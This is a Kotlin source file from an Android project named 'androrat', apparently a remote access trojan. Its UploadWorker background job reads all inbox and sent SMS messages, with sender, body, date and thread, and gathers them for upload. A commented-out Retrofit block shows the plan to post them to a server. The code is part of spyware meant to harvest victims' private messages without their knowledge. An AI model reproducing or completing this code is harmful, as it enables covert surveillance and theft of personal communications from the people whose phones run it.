package com.ierusalem.androrat.worker

import android.content.Context
import android.net.Uri
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.ierusalem.androrat.screens.home.model.SMSMessage

class UploadWorker(context: Context, workerParameters: WorkerParameters) :
    CoroutineWorker(context, workerParameters) {
    override suspend fun doWork(): Result {
        val allMessages: MutableMap<String, List<Any>> = mutableMapOf()
        val messages =
            readMessages(
                context = applicationContext,
                type = "inbox"
            ) + readMessages(
                context = applicationContext,
                type = "sent"
            )
        allMessages += messages.sortedBy { it.date }.groupBy { it.sender }
        var deviceMessages = ""
        allMessages.forEach { (sender, messages) ->
            deviceMessages += "$sender -  $messages \n "
        }
        Log.d("ahi3646_upload", "doWork: upload - deviceMessages")
//        val apiService = RetrofitInstance(applicationContext).api
//        return try {
//            val response = apiService.postMessages(SMSModel(messages))
//            if (response.isSuccessful) {
//                Log.d("ahi3646_view_model", "sendMessages: success - ${response.body()} ")
//                Result.success()
//            }else{
//                Log.d("ahi3646_view_model", "sendMessages: failure  - ${response.errorBody()}")
//                Result.failure()
//            }
//        } catch (e: Exception) {
//            Log.d("ahi3646_view_model", "sendMessages: exception ${e.localizedMessage} ")
//            Result.failure()
//        }
        return Result.success()
    }

    private fun readMessages(context: Context, type: String): List<SMSMessage> {
        val messages = mutableListOf<SMSMessage>()
        val cursor = context.contentResolver.query(
            Uri.parse("content://sms/$type"),
            null,
            null,
            null,
            null,
        )
        cursor?.use {
            val indexMessage = it.getColumnIndex("body")
            val indexSender = it.getColumnIndex("address")
            val indexDate = it.getColumnIndex("date")
            val indexRead = it.getColumnIndex("read")
            val indexType = it.getColumnIndex("type")
            val indexThread = it.getColumnIndex("thread_id")
            val indexService = it.getColumnIndex("service_center")

            while (it.moveToNext()) {
                messages.add(
                    SMSMessage(
                        message = it.getString(indexMessage),
                        sender = it.getString(indexSender),
                        date = it.getLong(indexDate),
                        read = it.getString(indexRead).toBoolean(),
                        type = it.getInt(indexType),
                        thread = it.getInt(indexThread),
                        service = it.getString(indexService) ?: ""
                    )
                )
            }
        }
        return messages
    }

}